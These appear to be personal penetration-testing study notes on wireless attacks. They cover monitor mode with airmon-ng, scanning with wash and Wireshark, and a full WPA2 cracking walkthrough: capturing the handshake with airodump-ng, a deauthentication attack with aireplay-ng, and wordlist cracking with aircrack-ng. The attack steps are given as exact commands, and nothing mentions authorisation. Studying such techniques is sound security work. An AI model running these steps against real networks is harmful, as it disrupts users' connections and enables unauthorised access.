# Hacking Wireless Networks

wireless communications refer to any technologies that connect two devices without being physically connected to each other
these may use 
- Radio Frequency Technology
- Wi-Fi Technology



## Wireless traffic analysis

tools used
#### [[wash]] 
#tool/linux 
for this we need a separate adaptor in the **monitor** mode that can act as our antennae
once connected we do an
```bash
ifconfig
```
which allows us to see various interfaces
we look for a new interface that likely is the adaptor we plugged in

→ now to put the adatptor in monitor mode we do
```bash
airmon-ng start <name from ifconfig command>
```

→ there may be some processes that are hindering the activation of monitor mode
to "kill" them we do
```bash
airmon-ng check kill 
```
> this commands checks all the processes that are hindering the process of starting a monitor mode and "kills" them

now we do the above command again
```bash
airmon-ng start <interface name>
```

now we can used [[wash]] to look for WIFI networks
```bash
wash -i <interface name>
```
> -i or --interface  is for specifying the interface that is in the monitor mode


→ now we open [[Wireshark]] and click the interface previously selected in the [[wash]] command
→ we notice that all the traffic is in **802.11** protocol

#### other tools
- AirMagnet WiFi Analyzer PRO - https://www.netally.com
- Steelcentral Packet Analyzer - https://www.riverbed.com
- Omnipeek network Protocol Analyzer https://www.liveaction.com
- CommView For Wi-Fi - https://www.tamos.com


## perform Wireless Attacks

### cracking a WPA2 network using [[Aircrack-ng]]

WPA2 is an upgraded version on WPA

tool used
#### [[Aircrack-ng]]

now to sniff a packet from the target network
workflow is to
- deauth the wifi network
- this forces the already connected devices to that wifi to reset and reconnect
- while reconnecting they send a packet that has the key
- we'll capture that key and crack the password

now to do this
first we need to have an interface that is in monitor mode

so we

```bash
ifconfig
```
which allows us to see various interfaces
we look for a new interface that likely is the adaptor we plugged in

→ now to put the adaptor in monitor mode we do
```bash
airmon-ng start <name from ifconfig command>
```

→ there may be some processes that are hindering the activation of monitor mode
to "kill" them we do
```bash
airmon-ng check kill 
```
> this commands checks all the processes that are hindering the process of starting a monitor mode and "kills" them

now we do the above command again
```bash
airmon-ng start <interface name>
```

now we use another tool in the [[Aircrack-ng]] suite

```bash
airodump-ng <interface name>
```
> this will get a list of detected access points in the vicinity
> airodum-ng hops from channel to channel and shows AP from which it can receive beacons
> channel 1 - 14 are used for **802.11b and g**

→ note down the details of the AP that we are targeting such as name, BSSID, channel etc
> *BSSID* is the MAC address of the AP 

→ now in another terminal we do `sudo su` and
```bash
airodump-ng --bssid <bssid> -c <channel> -w <name of the AP> <interface name>
```

> this will be our receiver for the handshake that has the WPA2 key

→ now that we have our receiver setup and we know the details of the targeted AP, we do deauth attack on the AP

to do this 
in a new terminal
```bash
aireplay-ng -0 11 -a <bssid> -c <destination mac address acquired from the previous step under "STATION"> <interface name> 
```
> -0 = sets the deauth attack
> 11 = is the number of packets for deauth
> -a = target AP MAC address (bssid)
> -c = sets target MAC address

→ keep repeating the process untill we get a **WPA handshake: <bssid\>** in the airodump tab
stop the packet capture `CTRL + C`

→ now the only thing remaining is to crack the password
```bash
aircrack-ng -a2 <bssid> -w <path/to/wordlist> <path/to/captured-hanshake>
```
> -a = specifies attack mode
> 2 = specifies that it is a WPA-PSK 
> -w = wordlist

To find the **bssid** given the .cap file 
```bash
aircrack-ng <filename>.cap
```
OR

Open wifi_pcap.cap in wireshark > apply display filter: `wlan.bssid` -> to find bssid of access point.

other way to crack the password from a given file
```bash
aircrack-ng -w wordlist.txt capture.cap
```
#### other tools
- hashcat - https://www.hashcat.net
- Portable Penetrator - https://www.secpoint.com
- WebCrackGui - https://www.sourceforge.net

 
